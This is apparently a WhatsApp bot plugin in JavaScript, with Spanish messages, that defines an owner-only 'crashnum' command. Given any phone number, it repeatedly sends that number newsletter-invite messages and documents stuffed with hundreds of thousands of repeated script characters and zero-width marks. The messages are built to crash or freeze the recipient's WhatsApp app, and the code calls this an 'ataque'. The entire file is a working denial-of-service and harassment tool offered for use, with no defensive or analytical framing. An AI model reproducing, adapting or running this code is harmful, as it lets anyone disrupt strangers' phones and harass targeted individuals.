let handler = async (m, { conn, text, isOwner, command }) => {
    if (!isOwner) {
        return m.reply('Solo el propietario puede usar este comando.');
    }

    if (!text) {
        return conn.sendMessage(m.chat, { text: `😿 Debes proporcionar un número de teléfono.\nEjemplo: .${command} 573001112233` }, { quoted: m });
    }

    // Limpia todo lo que no sea número
    let number = text.replace(/[^0-9]/g, '');

    if (number.length < 8) return m.reply('❌ Número inválido.');

    // Convertir a JID de WhatsApp
    const jid = number + '@s.whatsapp.net';

    // Funciones de ataque
    const canalKill = async () => {
        const basura = 'ꦾ'.repeat(90000);
        await conn.relayMessage(jid, {
            newsletterAdminInviteMessage: {
                newsletterJid: "120363406360158608@newsletter",
                newsletterName: "ADOi" + basura.repeat(3),
                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                caption: "BILLIE BOT",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        }, {});
    };

    const docKill = async (i) => {
        const traba = 'ꦾ'.repeat(90000);
        const contenido = '\u200E'.repeat(5000) + i;
        await conn.sendMessage(jid, {
            document: Buffer.from(contenido),
            fileName: `ado 🔥_${i + 1}`.repeat(2),
            mimetype: 'application/msword',
            caption: traba.repeat(3)
        });
    };

    const canalGato = async () => {
        const basura = '𑇂𑆵𑆴𑆿'.repeat(75000);
        await conn.relayMessage(jid, {
            newsletterAdminInviteMessage: {
                newsletterJid: "120363229729656123@newsletter",
                newsletterName: "🔥👾🔥👾" + basura.repeat(3),
                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                caption: "El mejor bot",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        }, {});
    };

    const docGato = async (i) => {
        const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
        const contenido = '\u200E'.repeat(5000) + i;
        await conn.sendMessage(jid, {
            document: Buffer.from(contenido),
            fileName: `🔥 ado  🔥_${i + 1}`.repeat(2),
            mimetype: 'application/msword',
            caption: traba.repeat(3)
        });
    };

    m.reply(`☠️ Enviando ataque al número: +${number}`);

    const delayMs = 9000;
    const total = 50; // Para números, 200 es demasiado arriesgado
    const ciclos = Math.floor(total / 4);

    for (let i = 0; i < ciclos; i++) {
        await canalKill();
        await new Promise(r => setTimeout(r, delayMs));

        await docKill(i);
        await new Promise(r => setTimeout(r, delayMs));

        await canalGato();
        await new Promise(r => setTimeout(r, delayMs));

        await docGato(i);
        await new Promise(r => setTimeout(r, delayMs));
    }

    m.reply(`✔️ Ataque completado al número +${number}.`);
}

handler.command = ['crashnum']
handler.tags = ['owner']
handler.help = ['crashnum']
handler.owner = true

export default handler